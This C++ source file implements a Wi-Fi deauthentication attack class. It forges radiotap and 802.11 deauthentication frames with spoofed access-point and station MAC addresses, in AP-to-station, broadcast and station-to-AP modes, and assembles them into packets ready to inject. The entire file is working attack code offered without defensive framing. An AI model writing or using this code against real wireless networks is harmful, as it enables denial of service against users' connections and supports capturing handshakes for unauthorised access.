#include "DeauthAttack.h"


const dot11_radiotap_hdr DeauthAttack::rtap_hdr = {
    .it_version = 0,
    .it_pad = 0,
    .it_len = 8,
    .it_present = 0
};


DeauthAttack::DeauthAttack(const uint8_t* ap_mac_addr, const uint8_t* st_mac_addr, const int mode)
{
    this->init_pkt(ap_mac_addr, st_mac_addr, mode);
}


DeauthAttack::~DeauthAttack()
{

}


void DeauthAttack::init_pkt(const uint8_t* ap_mac_addr, const uint8_t* st_mac_addr, const int mode)
{
    this->deauth_fhdr.base.fctl_field = DEAUTH_FRAME;
    this->deauth_fhdr.base.duration = 0;
    this->deauth_fhdr.frag_seq_num = 0;
    for (size_t i = 0; i < 6; i++)
    {
        this->deauth_fhdr.bssid[i] = ap_mac_addr[i];
    }
    
    switch (mode)
    {
    case AP_TO_BROADCAST:
    case AP_TO_STATION:
    {
        for (size_t i = 0; i < 6; i++)
        {
            this->deauth_fhdr.rcv_addr[i] = st_mac_addr[i];
            this->deauth_fhdr.src_addr[i] = ap_mac_addr[i];
            this->deauth_fhdr.bssid[i] = ap_mac_addr[i];
        }
        this->wlm_hdr.reason_code = HANDSHAKE_TIMEOUT;
        break;
    }
    case STATION_TO_AP:
    {
        for (size_t i = 0; i < 6; i++)
        {
            this->deauth_fhdr.rcv_addr[i] = ap_mac_addr[i];
            this->deauth_fhdr.src_addr[i] = st_mac_addr[i];
            this->deauth_fhdr.bssid[i] = ap_mac_addr[i];
        }
        this->wlm_hdr.reason_code = CLASS3_NONASSOCIATED_STA;
        break;
    }
    default:
        break;
    }
    
}


wlan_deauth_pkt* DeauthAttack::assemble_pkt()
{
    uint64_t pkt_size = sizeof(this->rtap_hdr) + 
        sizeof(this->deauth_fhdr) + 
        sizeof(this->wlm_hdr);

    wlan_deauth_pkt* attack_pkt = (wlan_deauth_pkt*)malloc(sizeof(wlan_deauth_pkt));
    attack_pkt->size = pkt_size;
    attack_pkt->packet = (u_char*)malloc(attack_pkt->size);

    std::memcpy(
        attack_pkt->packet,
        &(this->rtap_hdr),
        sizeof(this->rtap_hdr)
    );

    std::memcpy(
        attack_pkt->packet + sizeof(this->rtap_hdr),
        &(this->deauth_fhdr),
        sizeof(this->deauth_fhdr)
    );

    std::memcpy(
        attack_pkt->packet + sizeof(this->rtap_hdr) + sizeof(this->deauth_fhdr),
        &(this->wlm_hdr),
        sizeof(this->wlm_hdr)
    );
    return attack_pkt;
}


wlan_deauth_pkt* DeauthAttack::get_pkt()
{
    wlan_deauth_pkt* attack_pkt = assemble_pkt();
    return attack_pkt;
}